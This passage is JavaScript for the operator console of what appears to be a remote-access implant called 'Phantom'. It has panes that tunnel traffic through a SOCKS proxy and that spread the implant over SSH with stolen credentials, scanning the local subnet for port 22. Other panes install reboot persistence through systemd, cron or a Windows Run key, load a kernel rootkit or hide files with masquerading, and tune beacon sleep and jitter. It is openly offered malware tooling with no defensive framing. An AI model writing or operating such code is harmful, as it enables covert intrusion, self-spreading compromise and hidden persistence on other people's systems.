    body.querySelector('#skstatus').onclick = () => this.run(s, 'socks', { sub: 'status' }, true);
    body.querySelector('#skcopy').onclick = () => copy(endpoint, 'endpoint copied');

    this.run(s, 'socks', { sub: 'status' }, true);
    const wait = setInterval(() => {
      if (!document.contains(body)) { clearInterval(wait); return; }
      const hit = (store.get(s.id)?.timeline || []).filter((c) => c.type === 'socks').pop();
      if (hit) {
        out.textContent = hit.result?.text || '(no output)';
        paintState(/running/i.test(hit.result?.text || '') ? 'running' : 'stopped',
          /running/i.test(hit.result?.text || ''));
      }
    }, 1600);
    ctx.timers.push(wait);
    return { refresh: () => {} };
  },

  /* ----------------------------------------------------- form (spread) */
  pane_form(body, s, ctx) {
    const tool = store.state.tools.tools.find((t) => t.id === 'spread');
    const fields = tool.args || [];
    body.innerHTML = `
      <div class="card"><div class="card-body">
        <div class="form-grid">
          ${fields.map((f) => `
            <label class="field ${f.wide ? 'wide' : ''}"><span>${esc(f.label)}</span>
              <input class="inp ${f.type === 'text' && f.name !== 'targets' ? 'mono' : ''}"
                id="f_${f.name}" placeholder="${esc(f.placeholder || '')}" value="${esc(f.default || '')}"></label>`).join('')}
          <label class="field"><span>&nbsp;</span>
            <button class="btn primary" id="fgo">${ico('i-up')} Spread</button></label>
        </div>
        <p class="muted tiny" style="margin-top:10px">Copies the running implant to each target over
          SSH and starts it detached. Blank targets scan port 22 on the local subnet.</p>
      </div></div>
      <pre class="logbox" id="fout">no run yet</pre>`;

    const out = body.querySelector('#fout');
    body.querySelector('#fgo').onclick = async () => {
      await this.run(s, 'spread', {
        targets: body.querySelector('#f_targets')?.value.trim(),
        user: body.querySelector('#f_user')?.value.trim(),
        pass: body.querySelector('#f_pass')?.value.trim(),
      }, true);
      out.textContent = 'spread queued &ndash; the log follows on the next beacon';
    };

    ctx.last = () => {};
    const wait = setInterval(() => {
      if (!document.contains(body)) { clearInterval(wait); return; }
      const hit = (store.get(s.id)?.timeline || []).filter((c) => c.type === 'spread').pop();
      if (hit) out.textContent = hit.result?.text || '(no output)';
    }, 1800);
    ctx.timers.push(wait);
    return { refresh: () => {} };
  },

  /* ------------------------------------------------ generic tool runner */
  pane_tool(body, s, ctx, meta) {
    const fields = meta.args || [];
    body.innerHTML = `
      <div class="card"><div class="card-body">
        <div class="form-grid">
          ${fields.map((f) => (f.type === 'select' ? `
            <label class="field"><span>${esc(f.label)}</span>
              <select class="inp" id="t_${f.name}">
                ${(f.options || []).map((o) => `<option value="${esc(o)}">${esc(o)}</option>`).join('')}
              </select></label>` : `
            <label class="field"><span>${esc(f.label)}</span>
              <input class="inp mono" id="t_${f.name}" placeholder="${esc(f.placeholder || '')}"
                value="${esc(f.default || '')}"></label>`)).join('')}
          <label class="field"><span>&nbsp;</span>
            <button class="btn primary" id="tgo">${ico('i-up')} ${esc(meta.label)}</button></label>
        </div>
        <p class="muted tiny" style="margin-top:10px">${esc(meta.blurb)}</p>
      </div></div>
      <pre class="logbox" id="tout">no run yet</pre>`;

    const out = body.querySelector('#tout');
    body.querySelector('#tgo').onclick = async () => {
      const payload = {};
      fields.forEach((f) => { payload[f.name] = body.querySelector(`#t_${f.name}`)?.value; });
      await this.run(s, meta.id, payload, true);
      out.textContent = 'queued - output follows on the next beacon';
    };
    const wait = setInterval(() => {
      if (!document.contains(body)) { clearInterval(wait); return; }
      const hit = (store.get(s.id)?.timeline || []).filter((c) => c.tool === meta.id).pop();
      if (hit) out.textContent = hit.result?.text || '(no output)';
    }, 1500);
    ctx.timers.push(wait);
    return { refresh: () => {} };
  },

  /* ------------------------------------------------------ persistence */
  pane_persist(body, s, ctx) {
    body.innerHTML = `
      <div class="card"><div class="card-body" style="display:grid;gap:10px">
        <div class="form-grid">
          <label class="field"><span>Method</span>
            <select class="inp" id="pemethod">
              <option value="auto">auto (best for the OS)</option>
              <option value="systemd">systemd unit (linux, root)</option>
              <option value="cron">cron @reboot (linux, user)</option>
              <option value="registry">HKCU Run key (windows)</option>
            </select></label>
          <label class="field"><span>&nbsp;</span>
            <button class="btn primary" id="pego">${ico('i-anchor')} Install persistence</button></label>
        </div>
        <p class="muted tiny">Copies the implant to a stable location and registers a reboot hook.
          Windows uses <code>%APPDATA%\\Phantom</code> plus the Run key; Linux uses
          <code>/usr/local/bin</code> plus a systemd unit (root) or user cron.</p>
      </div></div>
      <pre class="logbox" id="peout">no run yet</pre>`;

    const out = body.querySelector('#peout');
    body.querySelector('#pego').onclick = async () => {
      await this.run(s, 'persistence', { sub: body.querySelector('#pemethod').value }, true);
      out.textContent = 'persistence queued &ndash; output follows on the next beacon';
    };
    const wait = setInterval(() => {
      if (!document.contains(body)) { clearInterval(wait); return; }
      const hit = (store.get(s.id)?.timeline || []).filter((c) => c.type === 'persist').pop();
      if (hit) out.textContent = (hit.result?.text || '(no output)') + (hit.ok ? '' : '\nfailed');
    }, 1800);
    ctx.timers.push(wait);
    return { refresh: () => {} };
  },

  /* ---------------------------------------------------------- rootkit */
  pane_rootkit(body, s, ctx) {
    body.innerHTML = `
      <div class="card"><div class="card-body" style="display:grid;gap:10px">
        <div class="form-grid">
          <label class="field"><span>Action</span>
            <select class="inp" id="rksub">
              <option value="status">status</option>
              <option value="install">install / cloak</option>
              <option value="remove">remove</option>
            </select></label>
          <label class="field"><span>Masquerade name</span>
            <input class="inp mono" id="rkname" placeholder="WinSync"></label>
          <label class="field"><span>&nbsp;</span>
            <button class="btn primary" id="rkgo">${ico('i-ghost')} Apply</button></label>
        </div>
        <p class="muted tiny">Linux loads <code>phantom_rootkit.ko</code> from
          <code>/tmp</code> &ndash; upload it first with the file browser. Windows hides a system copy with
          <code>attrib +h +s</code> and a masqueraded Run key.</p>
      </div></div>
      <pre class="logbox" id="rkout">no run yet</pre>`;

    const out = body.querySelector('#rkout');
    body.querySelector('#rkgo').onclick = async () => {
      await this.run(s, 'rootkit', {
        sub: body.querySelector('#rksub').value,
        name: body.querySelector('#rkname').value.trim(),
      }, true);
      out.textContent = 'action queued';
    };
    const wait = setInterval(() => {
      if (!document.contains(body)) { clearInterval(wait); return; }
      const hit = (store.get(s.id)?.timeline || []).filter((c) => c.type === 'rootkit').pop();
      if (hit) out.textContent = hit.result?.text || '(no output)';
    }, 1800);
    ctx.timers.push(wait);
    return { refresh: () => {} };
  },

  /* ------------------------------------------------------------- info */
  pane_info(body, s) {
    const rows = [
      ['Hostname', s.host?.hostname], ['Operator', s.host?.user], ['Platform', s.host?.os],
      ['Architecture', s.host?.arch], ['Address', s.remote], ['Reported IP', s.host?.ip],
      ['Process id', s.host?.pid], ['Working dir', s.host?.cwd], ['Kernel', s.host?.kernel],
      ['Elevated', s.host?.elevated ? 'yes' : 'no'],
      ['First seen', new Date((s.first_seen || 0) * 1000).toLocaleString()],
      ['Last beacon', new Date((s.last_seen || 0) * 1000).toLocaleString()],
      ['Session id', s.id],
    ];
    body.innerHTML = `
      <div class="split">
        <div class="card">
          <div class="card-head">${ico('i-info')}<h3>Reported identity</h3><span class="spacer"></span>
            <button class="btn ghost sm" id="ijson">${ico('i-copy')} Copy JSON</button></div>
          <div class="card-body"><dl class="kv">${rows.map(([k, v]) =>
            `<dt>${esc(k)}</dt><dd>${esc(v || '&ndash;')}</dd>`).join('')}</dl></div>
        </div>
        <div class="card">
          <div class="card-head">${ico('i-clock')}<h3>Beacon & annotations</h3></div>
          <div class="card-body">
            <div class="form-grid">
              <label class="field"><span>Sleep (s)</span>
                <input class="inp" id="i_sleep" type="number" min="1" value="${s.sleep}"></label>
              <label class="field"><span>Jitter (%)</span>
                <input class="inp" id="i_jitter" type="number" min="0" max="90" value="${s.jitter}"></label>
              <label class="field"><span>&nbsp;</span>
                <button class="btn" id="i_save_sleep">Apply beacon</button></label>
              <label class="field wide"><span>Note</span>
                <input class="inp" id="i_note" value="${esc(s.note || '')}" placeholder="what is this host?"></label>
              <label class="field wide"><span>Tags (comma separated)</span>
                <input class="inp" id="i_tags" value="${esc((s.tags || []).join(', '))}"></label>
              <label class="field"><span>&nbsp;</span>
                <button class="btn primary" id="i_save_meta">Save annotations</button></label>
            </div>
          </div>
        </div>
      </div>
      <div class="card">
        <div class="card-head">${ico('i-warn')}<h3>Actions</h3></div>
        <div class="card-body row wrap">
          <button class="btn sm" id="i_kill">${ico('i-trash')} Kill implant</button>
          <button class="btn sm danger" id="i_drop">${ico('i-close')} Remove session</button>
          <span class="spacer"></span>
          <span class="muted tiny">Removing only forgets the session server-side; killing exits on the host.</span>
        </div>
      </div>`;

    body.querySelector('#ijson').onclick = () => copy(JSON.stringify(s.host, null, 2), 'host JSON copied');
    body.querySelector('#i_save_sleep').onclick = async () => {
      await api.sleep(s.id, Number(body.querySelector('#i_sleep').value),
        Number(body.querySelector('#i_jitter').value));
      toast('beacon timing updated');
    };
    body.querySelector('#i_save_meta').onclick = async () => {
      const tags = body.querySelector('#i_tags').value.split(',').map((t) => t.trim()).filter(Boolean);
      await api.patchSession(s.id, { note: body.querySelector('#i_note').value, tags });
      toast('annotations saved');
    };
    body.querySelector('#i_kill').onclick = async () => {
      if (!(await confirm({ title: 'Kill the implant', body: 'The process exits on the target.',
        confirm: 'Kill', danger: true }))) return;
      await api.command(s.id, 'kill', {});
      toast('kill queued');
    };
    body.querySelector('#i_drop').onclick = async () => {
      if (!(await confirm({ title: 'Remove the session', body: 'Forget this host in the console.',
        confirm: 'Remove', danger: true }))) return;
      await api.dropSession(s.id);
      go(href.fleet());
    };
    return { refresh: () => {} };
  },
};
